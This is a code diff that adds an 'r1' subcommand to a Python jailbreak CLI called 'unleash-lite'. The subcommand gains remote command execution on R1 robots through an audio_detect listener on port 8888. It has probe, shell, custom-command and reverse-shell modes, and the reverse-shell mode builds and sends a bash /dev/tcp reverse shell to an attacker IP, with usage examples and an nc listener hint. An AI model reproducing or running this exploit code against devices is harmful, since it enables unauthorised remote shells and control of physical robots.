@@ -38,6 +38,9 @@ def main():
     if len(sys.argv) > 1 and sys.argv[1] == "serve":
         _main_serve()
         return
+    if len(sys.argv) > 1 and sys.argv[1] == "r1":
+        _main_r1()
+        return
 
     # Everything else is the jailbreak CLI
     parser = argparse.ArgumentParser(
@@ -48,6 +51,7 @@ def main():
                "  unleash-lite probe [--aes-key KEY] [--debug]\n"
                "  unleash-lite trigger [--hotkey L1+Y] [--robot-ip IP]\n"
                "  unleash-lite sdp-jailbreak <mode> [--interface-ip IP]  (benchtop only)\n"
+               "  unleash-lite r1 <mode> [--robot-ip IP]  (R1 via audio_detect)\n"
                "  unleash-lite serve [--port 8443] [--password SECRET]",
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
@@ -551,6 +555,120 @@ def _main_serve():
     server = UnleashServer(host=args.host, port=args.port,
                            password=args.password)
     server.run()
+
+
+_R1_MODES = [
+    "reverse-shell", "custom", "shell", "probe",
+]
+
+
+def _main_r1():
+    parser = argparse.ArgumentParser(
+        prog="unleash-lite r1",
+        description="R1 jailbreak via audio_detect socket (port 8888). "
+                    "Requires L1+L2+Start on the controller to activate "
+                    "the listener first.",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="Prerequisites:\n"
+               "  1. R1 must be on firmware >= 1.4.x with vui_service 2.2.0+\n"
+               "  2. Press L1+L2+Start on the controller (plays audio_detect.wav)\n"
+               "  3. Port 8888 is now listening — run this tool\n\n"
+               "Examples:\n"
+               "  unleash-lite r1 probe\n"
+               "  unleash-lite r1 shell\n"
+               "  unleash-lite r1 custom --cmd 'id; hostname'\n"
+               "  unleash-lite r1 reverse-shell --attacker-ip 192.168.123.100\n",
+    )
+    parser.add_argument("mode", choices=_R1_MODES, help="Operation mode")
+    parser.add_argument("--robot-ip", default="192.168.123.161",
+                        help="R1 IP address (default: 192.168.123.161)")
+    parser.add_argument("--port", type=int, default=8888,
+                        help="audio_detect listener port (default: 8888)")
+    parser.add_argument("--cmd",
+                        help="Shell command for 'custom' mode")
+    parser.add_argument("--attacker-ip",
+                        help="Attacker IP for reverse-shell mode")
+    parser.add_argument("--attacker-port", type=int, default=4444,
+                        help="Attacker port for reverse-shell (default: 4444)")
+    args = parser.parse_args(sys.argv[2:])
+
+    from .r1_audio_detect import (
+        R1AudioDetectError, probe_listener, exec_shell,
+        interactive_shell,
+    )
+
+    robot_ip = args.robot_ip
+    port = args.port
+    mode = args.mode
+
+    print()
+    print("  \033[1;36m" + "=" * 55 + "\033[0m")
+    print("  \033[1;36m\033[1m  UnLeash Lite — R1 (audio_detect)\033[0m")
+    print("  \033[1;36m" + "=" * 55 + "\033[0m")
+    print(f"  \033[1;32m  Target:  {robot_ip}:{port}\033[0m")
+    print(f"  \033[1;32m  Mode:    {mode}\033[0m")
+    print("  \033[1;36m" + "=" * 55 + "\033[0m")
+    print()
+
+    if mode == "probe":
+        print(f"  Probing {robot_ip}:{port}...")
+        if probe_listener(robot_ip, port):
+            print("  \033[1;32mListener is ACTIVE — ready for commands.\033[0m")
+            print(f"  Next: unleash-lite r1 shell --robot-ip {robot_ip}")
+        else:
+            print("  \033[1;31mListener NOT active.\033[0m")
+            print("  Press L1+L2+Start on the controller to activate it.")
+        print()
+        return
+
+    # All other modes need the listener to be active
+    print(f"  Checking listener...")
+    if not probe_listener(robot_ip, port):
+        print(f"  \033[1;31mError: listener not active on port {port}.\033[0m")
+        print("  Press L1+L2+Start on the controller first.")
+        print()
+        sys.exit(1)
+    print("  \033[1;32mListener active.\033[0m")
+    print()
+
+    try:
+        if mode == "reverse-shell":
+            attacker_ip = args.attacker_ip
+            if not attacker_ip:
+                attacker_ip = _get_local_ip()
+            if not attacker_ip:
+                print("  Error: --attacker-ip required")
+                sys.exit(1)
+            attacker_port = args.attacker_port
+            print(f"  Sending reverse shell -> {attacker_ip}:{attacker_port}")
+            print(f"  (Start listener first: nc -lvnp {attacker_port})")
+            cmd = (f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/"
+                   f"{attacker_port} 0>&1 &'")
+            output, rc = exec_shell(robot_ip, cmd, port=port)
+            print(f"  \033[1;32mSent!\033[0m")
+            if output.strip():
+                print(f"  {output.strip()}")
+
+        elif mode == "custom":
+            if not args.cmd:
+                print("  Error: --cmd required for custom mode")
+                sys.exit(1)
+            print(f"  Executing: {args.cmd}")
+            output, rc = exec_shell(robot_ip, args.cmd, port=port)
+            if output:
+                for line in output.rstrip("\n").split("\n"):
+                    print(f"  {line}")
+            if rc is not None and rc != 0:
+                print(f"  \033[1;33m[exit {rc}]\033[0m")
+
+        elif mode == "shell":
+            interactive_shell(robot_ip, port=port)
+
+    except R1AudioDetectError as e:
+        print(f"  \033[1;31mError: {e}\033[0m")
+        sys.exit(1)
+
+    print()
 
 
 if __name__ == "__main__":
